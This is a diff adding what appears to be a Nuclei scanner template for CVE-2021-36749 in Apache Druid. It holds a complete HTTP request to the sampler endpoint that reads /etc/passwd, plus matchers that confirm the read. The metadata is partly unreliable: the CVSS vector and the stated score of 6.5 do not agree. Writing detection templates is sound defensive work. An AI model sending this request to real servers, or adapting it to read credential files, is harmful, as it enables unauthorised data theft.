@@ -1,0 +1,65 @@
+id: apache-druid-cve-2021-36749
+info:
+  name: Apache Druid Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Druid <= 0.21.1 version has arbitrary file reading vulnerabilities. Attackers can obtain sensitive information such as configuration files to further control the system.
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 6.5
+    cve-id: CVE-2021-36749
+  tags: file-read,apache-druid
+
+variables:
+  filepath: "file:///etc/passwd"
+
+http:
+  - raw:
+      - |
+        POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "type": "index",
+          "spec": {
+            "type": "index",
+            "ioConfig": {
+              "type": "index",
+              "firehose": {
+                "type": "http",
+                "uris": ["{{filepath}}"]
+              }
+            },
+            "dataSchema": {
+              "dataSource": "sample",
+              "parser": {
+                "type": "string",
+                "parseSpec": {
+                  "format": "regex",
+                  "pattern": "(.*)",
+                  "columns": ["a"],
+                  "dimensionsSpec": {},
+                  "timestampSpec": {
+                    "column": "no_ such_ column",
+                    "missingValue": "2010-01-01T00:00:00Z"
+                  }
+                }
+              }
+            }
+          },
+          "samplerConfig": {
+            "numRows": 500,
+            "timeoutMs": 15000
+          }
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:0:0:"
+        part: body
